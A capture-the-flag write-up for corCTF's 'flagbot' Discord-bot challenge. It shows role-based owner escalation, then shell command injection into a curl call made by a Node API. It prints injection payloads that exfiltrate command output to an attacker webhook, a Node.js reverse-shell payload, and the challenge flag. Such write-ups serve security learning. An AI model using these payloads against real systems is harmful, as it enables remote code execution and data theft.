# flagbot

## Challenge

a discord bot is playing a song from youtube on loop

some bot commands are restricted to owners, some are restricted to the author of the bot

the bot was set up by the author typing a command, it remembers the song id and sends it to an api server, which returns the audio stream

the bot must resend this song id every loop

## Solution

none of the user commands are helpful, we must escalate to owner status

from the source code:

```js
// must have special role!!!!
let isOwner = msg.guild
    && msg.channel.type === "text"        // wouldnt this be funny lol
    && msg.member.roles.cache.find(r => r.name === /*"Server Booster*/ "flagbot");

// must be a bot author :)
//              Strellic               FizzBuzz101
let isAuthor = ["140239296425754624", "480599846198312962"].includes(msg.author.id);
```

the owner is verified by the following criteria:

 - the message must be sent in a server
 - the message must be sent in a text channel
 - the message sender must have the role "flagbot"

if we use developer tools to get the client id of the bot, we can see that the bot is public, not private

therefore, we can invite it to our personal discord server

we can give ourselves a role called "flagbot" and access all owner commands

the useful owner command from the source code:

```js
else if(cmd === "status") {
            if(!isOwner) {
                return msg.reply("you are not the bot's owner!");
            }

            fetch(API + "/check", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ url: args.slice(1).join(" ") })
            }).then(r => r.text()).then(r => {
                return msg.reply(r);
            })
            .catch(err => {
                return msg.reply(`there was an error checking for the website status!`);
            });
        }
```

which interacts with the api from:

```js
app.post("/check", (req, res) => {
    let url = req.body.url;
    if(!url || typeof url !== "string" || !url.startsWith("http")) {
        return res.end("invalid url!");
    }
    exec(`curl -s --head --request GET "${url.replace(/"/g, '')}"`, {timeout: 1000}, (error, stdout, stderr) => {
        if(error || stderr || (!stdout.includes("200") && !stdout.includes("301"))) {
            return res.end(`the website is down!`);
        }
        return res.end(`the website is up!`);
    });
});
```

this uses string substitution in a bash command

we can use the `$(...)` to execute commands within this curl command

by sending a url like `https://<owned-webhook>/$(echo test)` we can run commands and leak the output

we can get more complicated output using `https://google.com/$(echo test 2>&1 | curl -s -X POST --data-binary @- https://<owned-webhook>)`

here it does not matter what the first url is, as the second url will receive the POST request

lastly, known nodejs is running on the server, we can spawn a reverse shell by piping stdin to node:

```
f!status https://google.com/$(echo '(function(){
    var net = require(`net`),
        cp = require(`child_process`),
        sh = cp.spawn(`/bin/sh`, []);
    var client = new net.Socket();
    client.connect(4242, `<owned-webhook>`, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();' | node 2>&1 | curl -s -X POST --data-binary @- https://<owned-webhook>)
```

once we have a reverse shell there are a number of options we have

the solution I used was `node inspect <PID>` to attach to the running node server

from the debugger, you could watch the `url` variable and set a breakpoint for when the bot looped

then you could read the youtube video url from the debugger and get the flag

## Flag

`corctf{what_a_bop_amiright??}`

